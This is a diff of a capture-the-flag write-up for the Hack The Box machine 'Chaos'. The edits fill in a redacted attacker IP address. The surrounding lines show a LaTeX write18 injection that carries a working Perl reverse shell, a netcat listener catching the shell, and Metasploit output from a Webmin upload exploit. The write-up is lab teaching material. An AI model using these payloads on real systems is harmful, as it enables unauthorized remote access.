@@ -17,9 +17,7 @@ Chaos is a retired "vulnerable by design" machine created by [felamos][1] and ho
 
 ```text
 ~/ctf/htb/chaos λ nmap -sS -sV -A 10.10.10.120
-```
 
-```
 PORT      STATE SERVICE  VERSION
 80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
 |_http-server-header: Apache/2.4.34 (Ubuntu)
@@ -440,7 +438,7 @@ I started to search around for that mode and what it does. Turns out it allows p
 Now I'm ready to receive a connection on port 9002. Let's craft the text for the pdf maker so that it runs our reverse shell and connects back:
 
 ```text
-\immediate\write18{perl -e 'use Socket;$i="10.10.x.x";$p=9002;socket(S,PF_INET,SOCK_STREAM,
+\immediate\write18{perl -e 'use Socket;$i="10.10.14.33";$p=9002;socket(S,PF_INET,SOCK_STREAM,
 getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
 open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
 ```
@@ -450,7 +448,7 @@ Once I hit the "Create PDF" button, it works. I now have a shell on the machine:
 ```text
 ~/ctf/htb/chaos λ nc -l -n -v -p 9002
 listening on [any] 9002 ...
-connect to [10.10.x.x] from (UNKNOWN) [10.10.10.120] 43736
+connect to [10.10.14.33] from (UNKNOWN) [10.10.10.120] 43736
 /bin/sh: 0: can't access tty; job control turned off
 $
 ```
@@ -607,13 +605,13 @@ Okay, we've set the required options and we're ready to send the exploit:
 ```text
 msf5 exploit(unix/webapp/webmin_upload_exec) > exploit
 
-[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Started reverse TCP handler on 10.10.14.33:4444 
 [+] Session cookie: dff81043d5e7e399da11f92929578f18
 [*] Target URL => https://10.10.10.120:10000
 [*] Searching for directory to upload...
 [+] File vyiywme.cgi was successfully uploaded.
 [*] Attempting to execute the payload...
-[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.10.10.120:59360) at 2019-05-26 08:58:08 -0500
+[*] Command shell session 1 opened (10.10.14.33:4444 -> 10.10.10.120:59360) at 2019-05-26 08:58:08 -0500
 [+] Deleted vyiywme.cgi
 ```
 
